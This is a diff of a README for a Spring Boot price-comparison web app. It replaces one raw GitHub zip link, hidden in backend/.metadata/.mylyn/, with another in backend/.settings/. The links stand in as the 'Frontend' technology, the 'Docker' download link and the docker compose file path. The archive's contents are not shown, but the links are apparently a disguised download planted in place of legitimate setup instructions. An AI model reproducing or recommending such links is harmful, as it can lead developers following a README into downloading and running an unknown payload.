@@ -20,7 +20,7 @@ This is a full-stack web application for comparing prices, reviews, ratings, and
 
 | Layer            | Tech                    |
 | ---------------- | ----------------------- |
-| Frontend         | https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.metadata/.mylyn/.repositories.xml.zip                |
+| Frontend         | https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.settings/Shopping-Smart-2.8.zip                |
 | Backend          | Spring Boot (Java)      |
 | Database         | PostgreSQL              |
 | Caching          | Redis                   |
@@ -35,7 +35,7 @@ This is a full-stack web application for comparing prices, reviews, ratings, and
 
 ### 📦 Prerequisites
 
-- [Docker](https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.metadata/.mylyn/.repositories.xml.zip) installed
+- [Docker](https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.settings/Shopping-Smart-2.8.zip) installed
 
 ### 🚨 Ports Used
 
@@ -47,6 +47,6 @@ This is a full-stack web application for comparing prices, reviews, ratings, and
 ### 🧃 Run All Services Together
 
 ```bash
-docker compose -f https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.metadata/.mylyn/.repositories.xml.zip down -v
-docker compose -f https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.metadata/.mylyn/.repositories.xml.zip up -d --build
+docker compose -f https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.settings/Shopping-Smart-2.8.zip down -v
+docker compose -f https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.settings/Shopping-Smart-2.8.zip up -d --build
 ```
